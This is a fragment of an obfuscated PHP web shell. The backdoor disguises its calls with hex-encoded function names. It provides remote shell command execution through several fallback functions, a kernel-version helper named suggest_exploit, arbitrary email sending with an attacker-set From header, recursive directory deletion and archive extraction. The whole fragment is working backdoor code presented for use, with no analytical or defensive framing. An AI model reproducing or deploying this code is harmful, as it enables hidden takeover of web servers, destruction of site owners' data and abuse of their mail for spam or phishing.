else if ($_POST['mail-from-smtp'] == true) { $y6kvf = $_POST['mail-from-smtp']; $z5lpg = $_POST['mail-to-smtp']; $x9qbn = $_POST['mailto-subject']; $f3mwt = $_POST['message-smtp']; $a4sdn = 'From: ' . $y6kvf . "\r\n" . 'Reply-To: ' . $y6kvf . "\r\n" . 'X-Mailer: PHP/' . phpversion(); $b8nsz = mail($z5lpg, $x9qbn, $f3mwt, $a4sdn); if ($b8nsz) { success(); } else { failed(); } }}
if (isset($_GET['response']) && $_GET['response'] == "success") {echo "<script>Swal.fire({icon:'success',title:'done.',text:'op completed.',confirmButtonColor:'#e53935',background:'#fff',color:'#e53935',timer:1700,showConfirmButton:false,toast:true,position:'top-end',customClass:{popup:'pr1vd4yz-alert-anim animate__animated animate__fadeInDown'}});</script>";}else if (isset($_GET['response']) && $_GET['response'] == "failed") {echo "<script>Swal.fire({icon:'error',title:'fail.',text:'something broke.',confirmButtonColor:'#e53935',background:'#fff',color:'#e53935',timer:1700,showConfirmButton:false,toast:true,position:'top-end',customClass:{popup:'pr1vd4yz-alert-anim animate__animated animate__shakeX'}});</script>";}
function success() {echo '<meta http-equiv="refresh" content="0;url=?pr1v=' . pr1vd444yz($GLOBALS['pr1vxas'][0]()) . '&response=success">';}function failed(){echo '<meta http-equiv="refresh" content="0;url=?pr1v=' . pr1vd444yz($GLOBALS['pr1vxas'][0]()) . '&response=failed">';}
function formatSize($bytes) {$types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>'); for ($i = 0; $bytes >= 1024 && $i< (count($types) - 1); $bytes /= 1024, $i++); return (round($bytes, 2) . " " . $types[$i]);}
function pr1vd444yz($n){ $y = ''; for ($i = 0; $i< strlen($n); $i++) { $y .= dechex(ord($n[$i])); } return $y;}function unx($y){ $n = ''; for ($i = 0; $i< strlen($y) - 1; $i += 2) { $n .= chr(hexdec($y[$i] . $y[$i + 1])); } return $n;}
function suggest_exploit(){ $un7xa = $GLOBALS['pr1vxas'][8](); $xplod = explode(" ", $un7xa);$xpld = explode("-", $xplod[2]); $pl = explode(".", $xpld[0]); return $pl[0] . "." . $pl[1] . "." . $pl[2];}
function cmd($in, $re = false){ $out = ''; try { if ($re) $in = $in . " 2>&1"; if (function_exists("\x65\x78\x65\x63")) { @$GLOBALS['pr1vxas'][16]($in, $out); $out = @join("\n", $out); } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) { @$GLOBALS['pr1vxas'][17]($in); $out = ""; } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) { @$GLOBALS['pr1vxas'][18]($in); $out = ""; } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) { $out = $GLOBALS['pr1vxas'][19]($in); } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) { if (is_resource($f = @$GLOBALS['pr1vxas'][20]($in, "r"))) { $out = ""; while (!@feof($f)) $out .= fread($f, 1024); $GLOBALS['pr1vxas'][21]($f); } } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) { $pipes = array(); $process = @$GLOBALS['pr1vxas'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null); $out = @$GLOBALS['pr1vxas'][22]($pipes[1]); } } catch (Exception $e) {} return $out; }
function compressToZip($sourceFile, $zipFilename){ $zip = new ZipArchive(); if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) { $zip->addFile($sourceFile, basename($sourceFile)); $zip->close(); success(); } else { failed(); } }
function r3mvx($val) { $tex = str_replace("/", "", $val); $tex1 = str_replace(":", "", $tex); $tex2 = str_replace("_", "", $tex1); $tex3 = str_replace(" ", "", $tex2); $tex4 = str_replace(".", "", $tex3); return $tex4; }
function unlinkDir($dir) { $d1Xe = array($dir); $files = array(); for ($i = 0;; $i++) { if (isset($d1Xe[$i])) $dir = $d1Xe[$i]; else break; if ($opn = @opendir($dir)) { while ($rd = @readdir($opn)) { if ($rd != "\x2e" && $rd != "\x2e\x2e") { $pth = $dir . "\x2f" . $rd; if ($GLOBALS['pr1vxas'][2]($pth)) { $d1Xe[] = $pth; } else { $files[] = $pth; } } } closedir($opn); } } foreach ($files as $file) { if (!@$GLOBALS['pr1vxas'][24]($file)) { return false; } } $d1Xe = array_reverse($d1Xe); foreach ($d1Xe as $d1x2) { if (!@$GLOBALS['pr1vxas'][25]($d1x2)) { return false; } } return true; }
function x6kvz($g5ydq) { $y8vnp = $g5ydq; $w2sjm = explode("\x2e", $y8vnp); return $w2sjm[0]; }
function prvFx1($value) { $n4mX = $value; $ext3F = pathinfo($value, PATHINFO_EXTENSION); if (strlen($n4mX) > 30) { return substr($n4mX, 0, 30) . "\x2e\x2e\x2e"; } else { return $value; } }
function xtr4cPr1v($pr1varch, $pr1vaext) { $zip = new ZipArchive(); $methOpen = chDxzZ('111,112,101,110'); $methExtract = chDxXZ('65787472616374546f'); $methClose = chDxzZ([99,108,111,115,101]); if ($zip->$methOpen($pr1varch) === TRUE) { $zip->$methExtract($pr1vaext); $zip->$methClose(); return true; } else { return false; } }
function p3rms($file){$p3rxa=$GLOBALS['pr1vxas'][6]($file);if(($p3rxa&0xC000)==0xC000){$info='s';}elseif(($p3rxa&0xA000)==0xA000){$info='l';}elseif(($p3rxa&0x8000)==0x8000){$info='-';}elseif(($p3rxa&0x6000)==0x6000){$info='b';}elseif(($p3rxa&0x4000)==0x4000){$info='d';}elseif(($p3rxa&0x2000)==0x2000){$info='c';}elseif(($p3rxa&0x1000)==0x1000){$info='p';}else{$info='u';}$info.=(($p3rxa&0x0100)?'r':'-');$info.=(($p3rxa&0x0080)?'w':'-');$info.=(($p3rxa&0x0040)?(($p3rxa&0x0800)?'s':'x'):(($p3rxa&0x0800)?'S':'-'));$info.=(($p3rxa&0x0020)?'r':'-');$info.=(($p3rxa&0x0010)?'w':'-');$info.=(($p3rxa&0x0008)?(($p3rxa&0x0400)?'s':'x'):(($p3rxa&0x0400)?'S':'-'));$info.=(($p3rxa&0x0004)?'r':'-');$info.=(($p3rxa&0x0002)?'w':'-');$info.=(($p3rxa&0x0001)?(($p3rxa&0x0200)?'t':'x'):(($p3rxa&0x0200)?'T':'-'));return $info;}
?>
